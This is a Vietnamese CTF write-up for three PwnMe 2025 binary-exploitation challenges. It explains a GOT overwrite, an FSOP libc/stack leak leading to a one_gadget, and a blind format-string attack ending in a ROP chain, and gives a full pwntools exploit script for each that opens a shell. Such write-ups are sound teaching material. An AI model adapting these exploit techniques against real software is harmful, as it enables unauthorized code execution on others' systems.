--- 
title: PwnMe CTF Quals 2025
date: 2025-02-16 
description : 'PWNME-2025'
tags: ['fsb','got']
authors: ['kuvee']
draft: false
---

## got

checksec: 

```cs
ploi@PhuocLoiiiii:~/pwn/PwnMeCTF/got/got$ checksec got
[*] '/home/ploi/pwn/PwnMeCTF/got/got/got'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- main : chương trình rất đơn giản , đầu tiên ta sẽ được nhập 1 idx , tiếp sau đó là nhập dữ liệu vào ```PNJS[idx]```  và nó nằm tại ```0x0000000000404080``` 

```cs
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  idx = 0;
  puts("Hey ! I've never seen Game of Thrones and i think i misspelled a name, can you help me ?");
  puts("Which name is misspelled ?\n1. John\n2. Daenarys\n3. Bran\n4. Arya");
  fwrite("> ", 1uLL, 2uLL, stdout);
  __isoc99_scanf("%d", &idx);
  if ( idx > 4 )
  {
    puts("Huuuhhh, i do not know that many people yet...");
    _exit(0);
  }
  puts("Oh really ? What's the correct spelling ?");
  fwrite("> ", 1uLL, 2uLL, stdout);
  read(0, &PNJs[idx], 0x20uLL);
  puts("Thanks for the help, next time i'll give you a shell, i already prepared it :)");
  return 0;
}
```

- rõ ràng đây là 1 bài xảy ra bug ```oob``` , ta có thể ghi idx tiến đến got và ghi vào thứ gì đó để lấy shell và may mắn là có 1 hàm win

```cs
void __cdecl shell()
{
  system("/bin/sh");
}
```

exp: 

```cs
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./got',checksec=False)

#p = process()
p = remote('got-4d27ff88d1920941.deploy.phreaks.fr',443,ssl=True)

p.sendline(b'-4')
input()
p.send(p64(0x401036) + p64(exe.sym.shell))

p.interactive()
```

## einstein

checksec: full giáp

```cs
ploi@PhuocLoiiiii:~/pwn/PwnMeCTF/einstein/einstein$ checksec einstein
[*] '/home/ploi/pwn/PwnMeCTF/einstein/einstein/einstein'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- handle: đây là hàm chứa dữ liệu chính cần khai thác của bài , đập vào mắt đầu tiên có lẽ là ta có 2 lệnh scanf -> ta có thể ghi tùy ý 2 lần 


```cs
int __cdecl handle()
{
  int offset; // [rsp+8h] [rbp-38h] BYREF
  unsigned int size; // [rsp+Ch] [rbp-34h] BYREF
  unsigned __int64 *wher; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 wat; // [rsp+18h] [rbp-28h] BYREF
  unsigned __int64 *wher2; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 wat2; // [rsp+28h] [rbp-18h] BYREF
  void *allocated; // [rsp+30h] [rbp-10h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  puts("\nHow long is your story ?");
  __isoc99_scanf("%u", &size);
  if ( size <= 0x27 )
  {
    puts("Well... It seems you don't really want to talk to me that much, cya.");
    _exit(1337);
  }
  allocated = malloc(size);
  puts("What's the distortion of time and space ?");
  __isoc99_scanf("%u", &offset);
  puts(
    "Well your story is quite long, time may be distored, but it is a priceless ressource, i'll give you a few words only"
    ", use them wisely.");
  read(0, (char *)allocated + offset, 0x22uLL);
  puts("Everything is relative... Or is it ???");
  __isoc99_scanf("%llu %llu", &wher, &wat);
  __isoc99_scanf("%llu %llu", &wher2, &wat2);
  *wher = wat;
  *wher2 = wat2;
  return 0;
}
```

- và bài này hốc búa ở chỗ là ta không biết bất cứ địa chỉ nào -> sẽ không thể ghi được gì , tuy nhiên để ý lại đoạn ở trên , ta được nhập 1 size và malloc(size) 
- tiếp theo ta được input vào 0x22 vào chunk đó , ở đây ta cần biết khi ta nhập 1 size lớn -> nó sẽ dùng mmap để tạo 1 vùng nhớ cho yêu cầu của malloc() , và vùng nhớ đó nằm dưới ngay libc

- ở đây mình nhập 1 size rất lớn

![here](/assets/images/PWNme2025/1.png)

- và nó nằm ngay dưới libc

![here](/assets/images/PWNme2025/2.png)

- như ta đã nói thì trước hết ta cần biết địa chỉ libc , ở đây ta cần tấn công ```fsop``` , chi tiết thì ta có thể xem ở [here](https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive/)  , ở đây mình chọn overwrite ```IO_write_PTR``` bằng byte ```\xff```  hoặc là ta có thể overwrite như link trên cũng được , và may mắn là ta có libc lẫn stack_address  
- lúc đầu mình không leak được stack_address vì phiên bản libc bài cho không giống sever , sau khi build docker và lấy libc lại thì mới leak được stack :)))

- cuối cũng đơn giản là overwrite ```saved_rip``` thành one_gadget thôi , ta có 2 lần ghi nên ta có thể làm cho nó thõa mãn điều kiện của one_gadget

- ở đây mình chọn cái này : 

rax NULL sẵn và ta chỉ cần setup cho ```rbp-0x78``` thôi là được

```cs
0xeb66b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```

exp: 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./einstein_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

p.sendlineafter(b'How long is your story ?\n', str(0x50000).encode())


p.sendlineafter(b"What's the distortion of time and space ?\n", str(0x253790+0x28).encode())


input()
p.sendafter(b'.\n', b'\xff')

p.recv(5)
libc_leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f'libc leak: {hex(libc_leak)}')
p.recv(0x92)
leak_stack = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f'leak_stack: {hex(leak_stack)}')
saved_rip = leak_stack - 0x120
log.info(f'saved_rip: {hex(saved_rip)}')
libc.address = libc_leak - 0x2008f0
log.info(f'libc: {hex(libc.address)}')
rbp = saved_rip + 8
og = [0xeb66b,0xeb60e,0x54f53,0x54f4c]

p.sendlineafter(b'Everything is relative... Or is it ???',str(int(saved_rip)) + ' ' + str(int(libc.address+og[0])))
input()
p.sendline(str(int(rbp-0x78)) + ' ' + str(int(0)))

p.interactive()
```





## noprint

- bài rất ngắn , nói đơn giản là trước hết nó sẽ malloc và trả về 1 địa chỉ heap , sau đó ta sẽ nhập dữ liệu vào vùng heap này , cuối cùng là dùng `fprintf` để ghi dữ liệu vào /dev/null 

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+20h] [rbp-10h]
  char *buf; // [rsp+28h] [rbp-8h]

  puts("Hello from the void");
  init(argv, envp);
  setbuf(_bss_start, 0);
  setbuf(stdin, 0);
  stream = fopen("/dev/null", "a");
  for ( buf = (char *)malloc(0x100u); ; fprintf(stream, buf) )
    buf[read(0, buf, 0x100u) - 1] = 0;
}
```

- khó khăn thứ nhất của bài này là ta không thể đặt dữ liệu lên stack dễ dàng được , thứ hai là ta không thể leak bất cứ thứ gì vì nó đang ghi vào /dev/null  , vậy ta chỉ có thể write? ta phải làm như thế nào? 


- có 2 cách để làm bài này : 

    - cách 1 : ghi đè return address của `vfprintf_internal` -> dùng định dạng *
    - cách 2 : thay đổi flags và fileno thành stdout -> có thể leak



- ta sẽ bắt đầu với cách 1 trước: 

offset của `rsp` ở bài này là 5 , và địa chỉ `0x55555555b6b0` sẽ chính là target của ta , ta sẽ cần thay đổi nó thành flags của stdout `0x00000000fbad2887` và `0x55555555b6b0+0x70` chính là fileno thành 1 

![image](https://hackmd.io/_uploads/rJM_7cmJxx.png)

- vì vậy ta sẽ cần kiếm các con trỏ trỏ đến nhau , và ở sau địa chỉ `libc_start_call_main` sẽ thích hợp để thực hiện việc này , ý tưởng của ta sẽ là sử dụng định dạng "*" để format string attack thay đổi giá trị tại offset đó thành `0x55555555b6b0+0x70` -> sau đó ta chỉ việc in ra 1 byte và ghi vào địa chỉ stack bên dưới , nó sẽ trông như sau: 

```c
s(b"%112c%*9$c%13$n".ljust(0x100, b"\0"))
s(b".%21$lln".ljust(0x100, b"\0"))
```

- lúc này ta thấy ta đã ghi thành công địa chỉ fileno , tiếp theo ta chỉ việc thay đổi flags -> `stdout` là được 

![image](https://hackmd.io/_uploads/BJ67H9m1el.png)


- lúc này ta đã hoàn tất việc thay đổi filestream thành stdout

![image](https://hackmd.io/_uploads/SySPHcQklg.png)


- cuối cùng chỉ cần thực hiện tương tự để build rop_chain , ở đây ta sẽ ghi rop_chain vào rip+8 trong fprintf , cuối cùng là thêm 1 ret để nó ret vào rop_chain 

exp:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from subprocess import check_output
from time import sleep

from pwn import *

context.terminal = [
    "wt.exe",
    "-w",
    "0",
    "split-pane",
    "-d",
    ".",
    "wsl.exe",
    "-d",
    "kali-linux",
    "--",
    "bash",
    "-c",
]
context.update(arch="amd64", os="linux")
context.log_level = "debug"
exe = context.binary = ELF("./noprint_patched", checksec=False)
libc = exe.libc
log_levels = ["info", "error", "warn", "debug"]
info = lambda msg: log.info(msg)
error = lambda msg: log.error(msg)
warn = lambda msg: log.warn(msg)
debug = lambda msg: log.debug(msg)


def one_gadget(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]


info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: (
    proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: (
    proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
)
sn = lambda num, proc=None: (
    proc.send(str(num).encode()) if proc else p.send(str(num).encode())
)
sna = lambda msg, num, proc=None: (
    proc.sendafter(msg, str(num).encode())
    if proc
    else p.sendafter(msg, str(num).encode())
)
sln = lambda num, proc=None: (
    proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
)
slna = lambda msg, num, proc=None: (
    proc.sendlineafter(msg, str(num).encode())
    if proc
    else p.sendlineafter(msg, str(num).encode())
)


def logbase():
    log.info("libc base = %#x" % libc.address)


def rcu(d1, d2=0):
    p.recvuntil(d1, drop=True)
    # return data between d1 and d2
    if d2:
        return p.recvuntil(d2, drop=True)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(
            int(pid),
            gdbscript=gdbscript
            + f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe",
            exe=exe.path,
        )
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
brva 0x0000000000001381
brva 0x00000000000013A7
c
"""

p = start()

# ==================== EXPLOIT ====================


def exploit():
    p.recvline()
    input()
    s(b"%112c%*9$c%13$n".ljust(0x100, b"\0"))
    s(b".%21$lln".ljust(0x100, b"\0"))
    s(f"%{0x2887}c%9$hn".encode().ljust(0x100, b"\0"))

    p.send(b"%11$p %12$p %16$p %50c".ljust(0x100, b"\x00"))
    p.recvuntil(b"0x")
    stack = int(p.recvuntil(b" "), 16) - 0xD8
    libc.address = int(p.recvuntil(b" "), 16) - 0x2A3B8
    exe.address = int(p.recvuntil(b" "), 16) - 0x12E4
    info(f"stack= {hex(stack)} libc: {hex(libc.address)} exe: {hex(exe.address)}")
    pop_rdi = libc.address + 0x00000000000CEE4D
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym.system
    info(f"bin_sh: {hex(bin_sh)}")
    info(f"system: {hex(system)}")
    info(f"pop: {hex(pop_rdi)}")

    ret = exe.address + 0x12E3

    def write_v(target, val):
        p.send(f"%{target&0xffff}c%11$hhn".encode().ljust(0x100, b"\0"))
        p.send(f"%{val&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))
        p.send(f"%{(target+2)&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
        p.send(f"%{(val>>16)&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))
        p.send(f"%{(target+4)&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
        p.send(f"%{(val>>32)&0xffff}c%31$n".encode().ljust(0x100, b"\0"))

    sleep(0.5)
    p.send(f"%{stack&0xffff}c%11$hn".encode().ljust(0x100, b"\0"))
    sleep(0.5)
    write_v(stack + 8, pop_rdi)
    sleep(0.5)
    write_v(stack + 16, bin_sh)
    sleep(0.5)
    write_v(stack + 24, system)
    sleep(0.5)
    p.send(f"%{stack&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
    sleep(0.5)
    p.send(f"%{ret&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))

    p.interactive()


if __name__ == "__main__":
    exploit()

```

cách 2 ta có thể xem ở đây: https://robbert1978.github.io/2025/03/02/2025-3-3-PwnMe-Quals-2025/
